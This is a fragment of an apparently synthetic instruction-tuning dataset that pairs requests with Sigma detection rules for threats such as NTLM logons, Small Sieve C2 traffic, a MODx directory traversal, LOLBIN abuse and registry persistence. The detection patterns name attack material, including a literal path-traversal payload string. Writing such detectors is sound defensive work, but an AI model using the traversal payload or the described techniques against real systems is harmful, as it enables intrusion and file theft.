    "instruction": "Build a Sigma rule with the goal of detecting logons using NTLM to hosts that are potentially not part of the domain..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect logons using NTLM to hosts that are potentially not part of the domain, you should monitor the operational logs from the Microsoft-Windows-NTLM service. Focus specifically on events with an ID of 8001, which indicate an NTLM authentication attempt. These attempts become particularly noteworthy when the target name of the authentication starts with 'TERMSRV', as this prefix is commonly associated with Terminal Services or Remote Desktop Services, and could indicate an attempt to access resources outside of the domain.\n\nCollect data fields such as the Computer name, Username, Domain Name, and Target Name during these events to help identify the source and target of the NTLM authentication attempts. Be cautious of false positives which may arise from legitimate host connections to valid domains, connections that do not use the Fully Qualified Domain Name (FQDN), and connections to external but legitimate domains. These can be safely excluded from alerts to minimize noise.\n\nThis monitoring strategy is aligned with identifying potentially malicious activities related to Credential Access and Lateral Movement, specifically focusing on suspicious NTLM logons that may indicate an adversary's attempt to move laterally within a network or access resources using compromised credentials.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: ntlm\n    definition: Requires events from Microsoft-Windows-NTLM/Operational\ndetection:\n    selection:\n        EventID: 8001\n        TargetName|startswith: 'TERMSRV'\n    condition: selection\nfields:\n    - Computer\n    - UserName\n    - DomainName\n    - TargetName\nfalsepositives:\n    - Host connections to valid domains, exclude these.\n    - Host connections not using host FQDN.\n    - Host connections to external legitimate domains.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: ntlm\n    definition: Requires events from Microsoft-Windows-NTLM/Operational\ndetection:\n    selection:\n        EventID: 8001\n        TargetName|startswith: 'TERMSRV'\n    condition: selection\nfields:\n    - Computer\n    - UserName\n    - DomainName\n    - TargetName\nfalsepositives:\n    - Host connections to valid domains, exclude these.\n    - Host connections not using host FQDN.\n    - Host connections to external legitimate domains.\nlevel: medium\n",
      "question": "logons using NTLM to hosts that are potentially not part of the domain.",
      "answer": "In order to detect logons using NTLM to hosts that are potentially not part of the domain, you should monitor the operational logs from the Microsoft-Windows-NTLM service. Focus specifically on events with an ID of 8001, which indicate an NTLM authentication attempt. These attempts become particularly noteworthy when the target name of the authentication starts with 'TERMSRV', as this prefix is commonly associated with Terminal Services or Remote Desktop Services, and could indicate an attempt to access resources outside of the domain.\n\nCollect data fields such as the Computer name, Username, Domain Name, and Target Name during these events to help identify the source and target of the NTLM authentication attempts. Be cautious of false positives which may arise from legitimate host connections to valid domains, connections that do not use the Fully Qualified Domain Name (FQDN), and connections to external but legitimate domains. These can be safely excluded from alerts to minimize noise.\n\nThis monitoring strategy is aligned with identifying potentially malicious activities related to Credential Access and Lateral Movement, specifically focusing on suspicious NTLM logons that may indicate an adversary's attempt to move laterally within a network or access resources using compromised credentials."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros, you should: Monitor for process creation events within Windows systems for any instances where the command line contains the string '\\Outlook\\Security\\EnableUnsafeClientMailRules'. This string's presence suggests an attempt to alter Outlook's security settings to enable potentially unsafe client mail rules that could allow the execution of applications or macros, often used by attackers to perform malicious activities. It is important to consider any detection of this activity as high risk, although the possibility of false positives is acknowledged to be unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '\\Outlook\\Security\\EnableUnsafeClientMailRules'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '\\Outlook\\Security\\EnableUnsafeClientMailRules'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros",
      "answer": "In order to detect an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros, you should: Monitor for process creation events within Windows systems for any instances where the command line contains the string '\\Outlook\\Security\\EnableUnsafeClientMailRules'. This string's presence suggests an attempt to alter Outlook's security settings to enable potentially unsafe client mail rules that could allow the execution of applications or macros, often used by attackers to perform malicious activities. It is important to consider any detection of this activity as high risk, although the possibility of false positives is acknowledged to be unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential C2 communication related to Small Sieve malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential C2 communication related to Small Sieve malware, you should monitor network traffic that passes through a proxy server for specific GET requests to the Telegram API. Specifically, look for requests to 'api.telegram.org' with the HTTP method 'GET'. These requests must contain both the 'chat_id=2090761833' and 'text=com/' in the URI. The presence of these exact parameters in a GET request could indicate an attempt to communicate with a command and control (C2) server associated with the Small Sieve malware. Given the context and specific parameters being used, such detection hints at a critical level of alert due to the unlikely nature of false positives. This method is instrumental in identifying possible command and control activities leveraged by adversaries, tagging the tactics and techniques to awareness and prevention strategies focused on mitigating such malicious communications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-host: 'api.telegram.org'\n        cs-uri|contains|all:\n            - 'chat_id=2090761833'\n            - 'text=com/'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-host: 'api.telegram.org'\n        cs-uri|contains|all:\n            - 'chat_id=2090761833'\n            - 'text=com/'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "potential C2 communication related to Small Sieve malware",
      "answer": "In order to detect potential C2 communication related to Small Sieve malware, you should monitor network traffic that passes through a proxy server for specific GET requests to the Telegram API. Specifically, look for requests to 'api.telegram.org' with the HTTP method 'GET'. These requests must contain both the 'chat_id=2090761833' and 'text=com/' in the URI. The presence of these exact parameters in a GET request could indicate an attempt to communicate with a command and control (C2) server associated with the Small Sieve malware. Given the context and specific parameters being used, such detection hints at a critical level of alert due to the unlikely nature of false positives. This method is instrumental in identifying possible command and control activities leveraged by adversaries, tagging the tactics and techniques to awareness and prevention strategies focused on mitigating such malicious communications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier,\nwhen magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a directory traversal vulnerability exploit attempt on a MODx Revolution webserver, specifically targeting the ability of attackers to read arbitrary files by manipulating the 'class_key' parameter in 'manager/controllers/default/resource/tvs.php', you should: look for webserver log entries where the Uniform Resource Identifier (URI) query contains the suspicious sequence '/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00'. This pattern suggests an attempt to exploit a path traversal flaw to access the 'win.ini' file on a Windows server, indicative of an attacker trying to read sensitive files outside the intended directory. Be aware that legitimate scanning activities from tools like Nuclei and other unclassified actions can generate similar log entries, which are considered false positives. This detection is classified as critical due to the potential impact of allowing attackers to read arbitrary files on the server.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains: /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00\n    condition: selection\nfalsepositives:\n    - Scanning from Nuclei\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains: /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00\n    condition: selection\nfalsepositives:\n    - Scanning from Nuclei\n    - Unknown\nlevel: critical\n",
      "question": "MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier,\nwhen magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter.\n",
      "answer": "In order to detect a directory traversal vulnerability exploit attempt on a MODx Revolution webserver, specifically targeting the ability of attackers to read arbitrary files by manipulating the 'class_key' parameter in 'manager/controllers/default/resource/tvs.php', you should: look for webserver log entries where the Uniform Resource Identifier (URI) query contains the suspicious sequence '/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00'. This pattern suggests an attempt to exploit a path traversal flaw to access the 'win.ini' file on a Windows server, indicative of an attacker trying to read sensitive files outside the intended directory. Be aware that legitimate scanning activities from tools like Nuclei and other unclassified actions can generate similar log entries, which are considered false positives. This detection is classified as critical due to the potential impact of allowing attackers to read arbitrary files on the server."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk, you should: Monitor Windows file events for any access to files ending with '\\desktop.ini'. Specifically, focus on accesses not originating from standard system directories such as 'C:\\Windows\\', 'C:\\Program Files\\', or 'C:\\Program Files (x86)\\', nor from operations related to JetBrains software updates or system upgrades found in paths like '\\AppData\\Local\\JetBrains\\Toolbox\\bin\\7z.exe' or starting with 'C:\\$WINDOWS.~BT\\NewOS\\'. Consider exceptions for activities conducted through Windows SCCM or equivalent management tools and actions that only involve reading list authorities to minimize false positives. This approach is set to a medium alert level due to its relevance in uncovering attempts to misuse folder displays for potentially unsanctioned modifications or obfuscations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: '\\desktop.ini'\n    filter_generic:\n        Image|startswith:\n            - 'C:\\Windows\\'\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_jetbrains:\n        Image|endswith: '\\AppData\\Local\\JetBrains\\Toolbox\\bin\\7z.exe'\n        TargetFilename|contains: '\\JetBrains\\apps\\'\n    filter_upgrade:\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\NewOS\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Operations performed through Windows SCCM or equivalent\n    - Read only access list authority\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: '\\desktop.ini'\n    filter_generic:\n        Image|startswith:\n            - 'C:\\Windows\\'\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n    filter_jetbrains:\n        Image|endswith: '\\AppData\\Local\\JetBrains\\Toolbox\\bin\\7z.exe'\n        TargetFilename|contains: '\\JetBrains\\apps\\'\n    filter_upgrade:\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\NewOS\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Operations performed through Windows SCCM or equivalent\n    - Read only access list authority\nlevel: medium\n",
      "question": "unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk.",
      "answer": "In order to detect unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk, you should: Monitor Windows file events for any access to files ending with '\\desktop.ini'. Specifically, focus on accesses not originating from standard system directories such as 'C:\\Windows\\', 'C:\\Program Files\\', or 'C:\\Program Files (x86)\\', nor from operations related to JetBrains software updates or system upgrades found in paths like '\\AppData\\Local\\JetBrains\\Toolbox\\bin\\7z.exe' or starting with 'C:\\$WINDOWS.~BT\\NewOS\\'. Consider exceptions for activities conducted through Windows SCCM or equivalent management tools and actions that only involve reading list authorities to minimize false positives. This approach is set to a medium alert level due to its relevance in uncovering attempts to misuse folder displays for potentially unsanctioned modifications or obfuscations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries, you should: Monitor process creation events on Windows systems for instances where the original file name is identified as 'Microsoft.NodejsTools.PressAnyKey.exe'. It is crucial to distinguish between benign and malicious activities by excluding any process where the image path ends with '\\Microsoft.NodejsTools.PressAnyKey.exe', as this path is associated with legitimate usage of the file. This approach is designed to catch attempts where attackers might rename or repurpose 'Microsoft.NodejsTools.PressAnyKey.exe' to execute malicious binaries, leveraging it as a Living Off The Land Binary (LOLBIN). It's important to note that there might be unknown false positives, and the threat level associated with this activity is deemed medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries",
      "answer": "In order to detect renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries, you should: Monitor process creation events on Windows systems for instances where the original file name is identified as 'Microsoft.NodejsTools.PressAnyKey.exe'. It is crucial to distinguish between benign and malicious activities by excluding any process where the image path ends with '\\Microsoft.NodejsTools.PressAnyKey.exe', as this path is associated with legitimate usage of the file. This approach is designed to catch attempts where attackers might rename or repurpose 'Microsoft.NodejsTools.PressAnyKey.exe' to execute malicious binaries, leveraging it as a Living Off The Land Binary (LOLBIN). It's important to note that there might be unknown false positives, and the threat level associated with this activity is deemed medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Monitor and alert for Bitlocker key retrieval..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to monitor and alert for Bitlocker key retrieval, you should focus on monitoring Azure audit logs for any activities related to key management. Specifically, pay attention to events within the KeyManagement category where the operation name is \"Read BitLocker key\". This activity could indicate someone is attempting to retrieve the BitLocker encryption keys, which can be a critical security concern. The detection of such activities is set to a medium severity level due to the potential impact and sensitivity of these encryption keys. Be aware that there might be cases where the detection could trigger on legitimate activities, but these instances are currently unknown. Keeping an eye on these specific operations within the Azure environment is essential for safeguarding against potential threats that seek to access sensitive encryption keys.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: KeyManagement\n        OperationName: Read BitLocker key\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: KeyManagement\n        OperationName: Read BitLocker key\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Monitor and alert for Bitlocker key retrieval.",
      "answer": "In order to monitor and alert for Bitlocker key retrieval, you should focus on monitoring Azure audit logs for any activities related to key management. Specifically, pay attention to events within the KeyManagement category where the operation name is \"Read BitLocker key\". This activity could indicate someone is attempting to retrieve the BitLocker encryption keys, which can be a critical security concern. The detection of such activities is set to a medium severity level due to the potential impact and sensitivity of these encryption keys. Be aware that there might be cases where the detection could trigger on legitimate activities, but these instances are currently unknown. Keeping an eye on these specific operations within the Azure environment is essential for safeguarding against potential threats that seek to access sensitive encryption keys."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of Clip.exe to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of Clip.exe to execute PowerShell, you should: focus on monitoring Windows Security logs, specifically searching for Event ID 4697 which involves service installation activities. It\u2019s essential that the 'System Security Extension' audit subcategory is enabled to properly log these events. The key indicator of a potential attack is the creation or modification of services that include the 'cmd', '&&', and 'clipboard]::' strings in the Service File Name, suggesting an attempt to execute PowerShell commands in a concealed manner using Clip.exe. It is important to treat every detection as highly suspicious, although there might be cases where the activity is not malicious (though such false positives are unknown). This activity is associated with tactics and techniques that include Execution and Defense Evasion, specifically focusing on the use of PowerShell and obfuscated commands to evade detection mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - '&&'\n            - 'clipboard]::'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - '&&'\n            - 'clipboard]::'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of Clip.exe to execute PowerShell",
      "answer": "In order to detect obfuscated use of Clip.exe to execute PowerShell, you should: focus on monitoring Windows Security logs, specifically searching for Event ID 4697 which involves service installation activities. It\u2019s essential that the 'System Security Extension' audit subcategory is enabled to properly log these events. The key indicator of a potential attack is the creation or modification of services that include the 'cmd', '&&', and 'clipboard]::' strings in the Service File Name, suggesting an attempt to execute PowerShell commands in a concealed manner using Clip.exe. It is important to treat every detection as highly suspicious, although there might be cases where the activity is not malicious (though such false positives are unknown). This activity is associated with tactics and techniques that include Execution and Defense Evasion, specifically focusing on the use of PowerShell and obfuscated commands to evade detection mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting registry persistence technique using the GlobalFlags and SilentProcessExit keys.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect registry persistence technique using the GlobalFlags and SilentProcessExit keys, you should focus on monitoring Windows registry modifications specifically within the context of setting registry keys that are known to be used for persisting malicious software across system reboots. These registry keys include the GlobalFlag and SilentProcessExit located under the \"\\Microsoft\\Windows NT\\CurrentVersion\\\" path. Any changes to the 'GlobalFlag' registry key, as well as the setting of 'ReportingMode' or 'MonitorProcess' under 'SilentProcessExit', should be closely scrutinized. These modifications can indicate an adversary is attempting to establish persistence on the system by manipulating these registry keys to control the behavior of the operating system or monitoring tools in a way that benefits the malicious software. This detection strategy is critical because modifications in these registry areas are indicative of stealth techniques aimed at maintaining a foothold within the system or executing malware without triggering security alerts. Monitoring for such activities is categorized at a high level of importance due to the potential impact of allowing adversaries to achieve persistent access to the system undetected.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_global_flag:\n        TargetObject|contains|all:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\'\n            - '\\Image File Execution Options\\'\n            - '\\GlobalFlag'\n    selection_silent_process:\n        TargetObject|contains|all:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\'\n            - '\\SilentProcessExit\\'\n        TargetObject|contains:\n            - '\\ReportingMode'\n            - '\\MonitorProcess'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_global_flag:\n        TargetObject|contains|all:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\'\n            - '\\Image File Execution Options\\'\n            - '\\GlobalFlag'\n    selection_silent_process:\n        TargetObject|contains|all:\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\'\n            - '\\SilentProcessExit\\'\n        TargetObject|contains:\n            - '\\ReportingMode'\n            - '\\MonitorProcess'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "registry persistence technique using the GlobalFlags and SilentProcessExit keys",
      "answer": "In order to detect registry persistence technique using the GlobalFlags and SilentProcessExit keys, you should focus on monitoring Windows registry modifications specifically within the context of setting registry keys that are known to be used for persisting malicious software across system reboots. These registry keys include the GlobalFlag and SilentProcessExit located under the \"\\Microsoft\\Windows NT\\CurrentVersion\\\" path. Any changes to the 'GlobalFlag' registry key, as well as the setting of 'ReportingMode' or 'MonitorProcess' under 'SilentProcessExit', should be closely scrutinized. These modifications can indicate an adversary is attempting to establish persistence on the system by manipulating these registry keys to control the behavior of the operating system or monitoring tools in a way that benefits the malicious software. This detection strategy is critical because modifications in these registry areas are indicative of stealth techniques aimed at maintaining a foothold within the system or executing malware without triggering security alerts. Monitoring for such activities is categorized at a high level of importance due to the potential impact of allowing adversaries to achieve persistent access to the system undetected."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a stored procedure is set or cleared for automatic execution in MSSQL, which signifies a stored procedure that is set to automatic execution runs every time an instance of SQL Server is started, you should: Monitor application logs from Windows systems, specifically focusing on MSSQL audit policies. Ensure that audit policy for monitoring 'sp_procoption' is enabled to capture relevant events in the application log. Look for log entries with the Provider Name set to 'MSSQLSERVER' and an EventID of 33205. These specific entries indicate the occurrence of an event related to automatic execution of stored procedures. The detection should zero in on log data containing references to 'object_name:sp_procoption' along with 'statement:EXEC', which highlights the execution of the stored procedure. It is important to consider the potential for false positives, which may arise from legitimate administrative actions utilizing this feature, though such occurrences are rare. Due to the sensitivity and high impact of automated execution of stored procedures in a SQL Server environment, any detection of such activity should be treated with a high level of scrutiny. Tags associated with this kind of monitoring are Persistence, Privilege Escalation, and Initial Access, as setting a stored procedure to run automatically can serve as a method for attackers to maintain persistence, elevate privileges, or gain initial access to a system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy to monitor for 'sp_procoption' must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains|all:\n            - 'object_name:sp_procoption'\n            - 'statement:EXEC'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the feature by administrators (rare)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy to monitor for 'sp_procoption' must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains|all:\n            - 'object_name:sp_procoption'\n            - 'statement:EXEC'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the feature by administrators (rare)\nlevel: high\n",
      "question": "when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started",
      "answer": "In order to detect when a stored procedure is set or cleared for automatic execution in MSSQL, which signifies a stored procedure that is set to automatic execution runs every time an instance of SQL Server is started, you should: Monitor application logs from Windows systems, specifically focusing on MSSQL audit policies. Ensure that audit policy for monitoring 'sp_procoption' is enabled to capture relevant events in the application log. Look for log entries with the Provider Name set to 'MSSQLSERVER' and an EventID of 33205. These specific entries indicate the occurrence of an event related to automatic execution of stored procedures. The detection should zero in on log data containing references to 'object_name:sp_procoption' along with 'statement:EXEC', which highlights the execution of the stored procedure. It is important to consider the potential for false positives, which may arise from legitimate administrative actions utilizing this feature, though such occurrences are rare. Due to the sensitivity and high impact of automated execution of stored procedures in a SQL Server environment, any detection of such activity should be treated with a high level of scrutiny. Tags associated with this kind of monitoring are Persistence, Privilege Escalation, and Initial Access, as setting a stored procedure to run automatically can serve as a method for attackers to maintain persistence, elevate privileges, or gain initial access to a system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting access to a domain user from a non-machine account.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect access to a domain user from a non-machine account, you should focus on monitoring security logs from Windows systems. Specifically, look for event ID 4662, which signals an attempt to access an object. The object type of interest is identified by its globally unique identifier (GUID) 'bf967aba-0de6-11d0-a285-00aa003049e2', which corresponds to user objects in Windows. This means the detection targets situations where someone is accessing properties of a user object within the domain.\n\nHowever, it's important to exclude events generated by machine accounts and specific system accounts used by Microsoft services (like those starting with 'MSOL_'), as these are normally involved in legitimate operations and could otherwise generate false positives. Machine accounts can be identified and excluded if the subject's username ends with a '$', a customary naming convention for such accounts.\n\nBe aware that legitimate administrative activities, such as configuring new users, might trigger this detection, which could lead to potential false positives.\n\nBy focusing on these criteria, the aim is to pinpoint access attempts to domain user objects that are not initiated by recognized system processes or machine accounts, indicating a possible unauthorized access or reconnaissance activity by an attacker trying to explore or compromise domain user accounts. This approach plays a crucial role in safeguarding against tactics and techniques related to unauthorized access, lateral movement, and domain discovery.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: Requires the \"Read all properties\" permission on the user object to be audited for the \"Everyone\" principal\ndetection:\n    selection:\n        EventID: 4662\n        ObjectType|contains: 'bf967aba-0de6-11d0-a285-00aa003049e2'\n        # Using contains as the data commonly is structured as \"%{bf967aba-0de6-11d0-a285-00aa003049e2}\"\n        # The user class (https://docs.microsoft.com/en-us/windows/win32/adschema/c-user)\n    filter:\n        - SubjectUserName|endswith: '$' # Exclude machine accounts\n        - SubjectUserName|startswith: 'MSOL_' # https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfalsepositives:\n    - Administrators configuring new users.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: Requires the \"Read all properties\" permission on the user object to be audited for the \"Everyone\" principal\ndetection:\n    selection:\n        EventID: 4662\n        ObjectType|contains: 'bf967aba-0de6-11d0-a285-00aa003049e2'\n        # Using contains as the data commonly is structured as \"%{bf967aba-0de6-11d0-a285-00aa003049e2}\"\n        # The user class (https://docs.microsoft.com/en-us/windows/win32/adschema/c-user)\n    filter:\n        - SubjectUserName|endswith: '$' # Exclude machine accounts\n        - SubjectUserName|startswith: 'MSOL_' # https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfalsepositives:\n    - Administrators configuring new users.\nlevel: medium\n",
      "question": "access to a domain user from a non-machine account",
      "answer": "In order to detect access to a domain user from a non-machine account, you should focus on monitoring security logs from Windows systems. Specifically, look for event ID 4662, which signals an attempt to access an object. The object type of interest is identified by its globally unique identifier (GUID) 'bf967aba-0de6-11d0-a285-00aa003049e2', which corresponds to user objects in Windows. This means the detection targets situations where someone is accessing properties of a user object within the domain.\n\nHowever, it's important to exclude events generated by machine accounts and specific system accounts used by Microsoft services (like those starting with 'MSOL_'), as these are normally involved in legitimate operations and could otherwise generate false positives. Machine accounts can be identified and excluded if the subject's username ends with a '$', a customary naming convention for such accounts.\n\nBe aware that legitimate administrative activities, such as configuring new users, might trigger this detection, which could lead to potential false positives.\n\nBy focusing on these criteria, the aim is to pinpoint access attempts to domain user objects that are not initiated by recognized system processes or machine accounts, indicating a possible unauthorized access or reconnaissance activity by an attacker trying to explore or compromise domain user accounts. This approach plays a crucial role in safeguarding against tactics and techniques related to unauthorized access, lateral movement, and domain discovery."
    }
  },
  {
